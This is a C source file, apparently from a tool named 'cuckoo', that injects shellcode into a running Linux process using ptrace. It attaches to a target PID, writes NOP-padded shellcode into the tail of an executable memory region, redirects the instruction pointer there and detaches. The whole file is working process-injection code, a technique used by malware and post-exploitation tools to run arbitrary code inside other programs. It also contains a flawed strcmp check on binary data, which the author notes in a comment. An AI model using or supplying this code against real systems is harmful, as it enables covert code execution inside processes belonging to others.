#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include "utils.h"
#include "maps.h"
#include "inject.h"
#include "shellcode.h"


static void setMemAndPrint(pid_t target_pid, unsigned long addr, unsigned char*data, size_t len)
{
    for(size_t i=0; i<len; i++)
    {
        printf("0x%x ", data[i]);
    }
    printf("\n");
    ptraceSetMems(target_pid, addr, data, len);
}

static unsigned long getShellcodeStartAddr(pid_t target_pid, size_t shellcode_len)
{

    maps_item *list = mapsParse(target_pid);
    maps_item *addr_item = getExecutableAddr(list);
    unsigned long addr = addr_item->end_addr - shellcode_len;
    printItem(list);
    destoryList(list);
    return addr;
}

int injectShellcode(pid_t target_pid, unsigned char *shellcode, size_t shellcode_len)
{
    ptraceAttach(target_pid);
    
    regs_type old_regs;
    ptraceGetRegs(target_pid, &old_regs);
    printf("0x%llx\n", old_regs.rip);

    regs_type *new_regs = (regs_type *)malloc(sizeof(regs_type));
    if(new_regs == NULL) oops("malloc error ", CUCKOO_SYSTEM_ERROR);
    memcpy(new_regs, &old_regs, sizeof(regs_type));

    size_t new_len = ((shellcode_len >> 3) + 1) << 3;
    unsigned char *new_shellcode = (unsigned char *)malloc(new_len);
    memset(new_shellcode, '\x90', new_len);
    memcpy(new_shellcode, shellcode, shellcode_len);
    unsigned long addr = getShellcodeStartAddr(target_pid, new_len);
    // unsigned long addr = addr_item->end_addr - new_len;

    setMemAndPrint(target_pid, addr, new_shellcode, new_len);
    unsigned char buffer[new_len];
    ptraceGetMems(target_pid, addr, buffer, new_len);
    assert(!strcmp(buffer, new_shellcode));  // should not use strcmp()
    
    
    new_regs->rip = addr;
    printf("[+] Setting RIP to 0x%llx\n\t", new_regs->rip);
    ptraceSetRegs(target_pid, new_regs);
    // ptraceGetRegs(target_pid, &old_regs);
    // printf("the rip is 0x%llx\n", old_regs.rip);
    // ptraceCont(target_pid);

    ptraceDetach(target_pid);
    free(new_shellcode);
    free(new_regs);
    return CUCKOO_OK;
}
